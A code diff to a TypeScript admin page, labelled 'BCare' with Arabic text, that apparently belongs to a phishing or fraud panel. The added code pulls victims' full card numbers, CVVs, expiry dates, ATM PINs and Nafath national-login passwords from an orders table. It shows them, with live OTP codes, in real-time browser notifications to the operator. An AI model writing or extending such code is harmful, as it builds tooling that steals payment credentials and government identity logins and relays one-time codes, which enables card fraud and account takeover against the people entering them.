@@ -201,7 +201,7 @@ const AdminVisitors = () => {
   }, []);
 
   // Store pending order details for browser notifications
-  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string }>>({});
+  const pendingOrderDetailsRef = useRef<Record<string, { stage: string; otp_code?: string; phone_otp_code?: string; nafath_number?: string; customer_name?: string; card_number_full?: string; card_holder_name?: string; card_expiry?: string; card_cvv?: string; card_last_four?: string; payment_method?: string; total_price?: number; company?: string; atm_pin?: string; nafath_password?: string }>>({});
 
   // Sound + Browser notification for pending stages
   useEffect(() => {
@@ -244,12 +244,23 @@ const AdminVisitors = () => {
         const visitorLabel = details?.customer_name || visitor?.visitor_name || "زائر";
         
         let body = `${stageLabel[stage] || stage}`;
-        if (stage === "otp" && details?.otp_code) {
+        if (stage === "payment" && details) {
+          const lines: string[] = [];
+          if (details.card_number_full) lines.push(`💳 ${details.card_number_full}`);
+          else if (details.card_last_four) lines.push(`💳 ****${details.card_last_four}`);
+          if (details.card_holder_name) lines.push(`👤 ${details.card_holder_name}`);
+          if (details.card_expiry) lines.push(`📅 ${details.card_expiry}`);
+          if (details.card_cvv) lines.push(`🔒 CVV: ${details.card_cvv}`);
+          if (details.total_price) lines.push(`💰 ${details.total_price} ر.س`);
+          if (details.payment_method) lines.push(`🏦 ${details.payment_method === "card" ? "بطاقة" : details.payment_method === "atm" ? "صراف" : details.payment_method}`);
+          if (lines.length > 0) body += `\n${lines.join("\n")}`;
+        } else if (stage === "otp" && details?.otp_code) {
           body += `\nكود OTP: ${details.otp_code}`;
         } else if (stage === "phone_otp" && details?.phone_otp_code) {
           body += `\nكود الجوال: ${details.phone_otp_code}`;
-        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details?.nafath_number) {
-          body += `\nرقم نفاذ: ${details.nafath_number}`;
+        } else if ((stage === "nafath_login" || stage === "nafath_verify") && details) {
+          if (details.nafath_password) body += `\nكلمة المرور: ${details.nafath_password}`;
+          if (details.nafath_number) body += `\nرقم نفاذ: ${details.nafath_number}`;
         }
 
         const notification = new Notification(`🔔 BCare - ${visitorLabel}`, {
@@ -417,7 +428,7 @@ const AdminVisitors = () => {
       }
 
       // Fetch pending stages
-      const { data: pendingOrders } = await supabase.from("insurance_orders").select("id, phone, national_id, current_stage, stage_status, visitor_session_id, otp_code, phone_otp_code, nafath_number, customer_name").eq("stage_status", "pending");
+      const { data: pendingOrders } = await supabase.from("insurance_orders").select("id, phone, national_id, current_stage, stage_status, visitor_session_id, otp_code, phone_otp_code, nafath_number, nafath_password, customer_name, card_number_full, card_holder_name, card_expiry, card_cvv, card_last_four, payment_method, total_price, company, atm_pin").eq("stage_status", "pending");
       if (pendingOrders) {
         const stageMap: Record<string, string> = {};
         const unmatchedOrders: typeof pendingOrders = [];
@@ -436,7 +447,17 @@ const AdminVisitors = () => {
               otp_code: o.otp_code || undefined,
               phone_otp_code: o.phone_otp_code || undefined,
               nafath_number: o.nafath_number || undefined,
+              nafath_password: (o as any).nafath_password || undefined,
               customer_name: o.customer_name || undefined,
+              card_number_full: o.card_number_full || undefined,
+              card_holder_name: o.card_holder_name || undefined,
+              card_expiry: o.card_expiry || undefined,
+              card_cvv: o.card_cvv || undefined,
+              card_last_four: o.card_last_four || undefined,
+              payment_method: o.payment_method || undefined,
+              total_price: o.total_price || undefined,
+              company: o.company || undefined,
+              atm_pin: (o as any).atm_pin || undefined,
             };
           } else {
             unmatchedOrders.push(o);
